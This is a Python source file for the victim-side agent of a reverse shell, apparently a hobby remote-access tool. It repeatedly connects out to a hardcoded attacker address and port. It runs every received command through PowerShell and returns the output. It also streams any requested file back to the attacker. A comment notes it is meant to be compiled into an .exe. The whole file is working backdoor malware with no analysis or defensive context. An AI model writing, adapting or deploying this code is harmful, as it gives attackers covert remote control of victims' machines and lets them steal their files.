# ========================== Victim =======================
import socket
import re
import subprocess
import time
import os
# to handle long results
endResult = "EOR"

# to handle downloading files from Victim
endFile = "EOF"
if __name__ == '__main__':

    # changeable according to Attacker (IPAttacker)
    IPAttacker = "192.168.1.2"
    PortAttacker = 2008
    AttackerSocket = (IPAttacker, PortAttacker)

    while True:
        try:
            VictimConnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            VictimConnection.connect(AttackerSocket)
            while True:
                AttackerCommand = VictimConnection.recv(1024)
                AttackerCommand = AttackerCommand.decode()

                # Filtering commands
                # 1- if it is terminated command
                if AttackerCommand.lower() == "stop":
                    VictimConnection.close()
                    break
                # 2- if it is command w/o output back
                elif AttackerCommand == "" or AttackerCommand.lower() == "clear" or AttackerCommand.lower() == "cls":
                    continue
                # 3- if it is navigating command
                elif AttackerCommand.startswith("cd"):
                    NewPath = AttackerCommand.strip("cd ")
                    if os.path.exists(NewPath):
                        os.chdir(NewPath)
                        continue
                    else:
                        continue
                # 4- if it is navigating (through partitions) command
                # change directory partition example >> d:
                elif len(AttackerCommand) == 2 and AttackerCommand[0].isalpha() and AttackerCommand[1] == ':':
                    if os.path.exists(AttackerCommand):
                        os.chdir(AttackerCommand)
                        continue
                    else:
                        continue
                # 5- if it is Downloading Command
                elif AttackerCommand.startswith("download"):
                    fileToDownload = AttackerCommand.replace("download ", "")
                    if os.path.exists(fileToDownload) and os.path.isfile(fileToDownload):
                        exist = "yes"
                        VictimConnection.send(exist.encode())
                        with open(fileToDownload, "rb") as file:
                            chunkFile = file.read(1024)

                            while len(chunkFile) > 0:
                                VictimConnection.send(chunkFile)
                                chunkFile = file.read(1024)
                            VictimConnection.send(endFile.encode())
                    else:
                        exist = "no"
                        VictimConnection.send(exist.encode())
                        continue
                else:
                    result = bytes()
                    # stdin=subprocess.DEVNULL to be able to run this in .exe format
                    out = subprocess.run(["powershell.exe", AttackerCommand], shell=True, capture_output=True, stdin=subprocess.DEVNULL)
                    if out.stderr.decode('utf-8') == "":
                        result = out.stdout
                        result = result.decode('utf-8') + endResult
                        result = result.encode('utf-8')
                    elif out.stderr.decode('utf-8') != "":
                        result = out.stderr
                        result = result.decode('utf-8') + endResult
                        result = result.encode('utf-8')
                    VictimConnection.sendall(result)
            # in real this break will be commented
            break
        except Exception:
            time.sleep(3)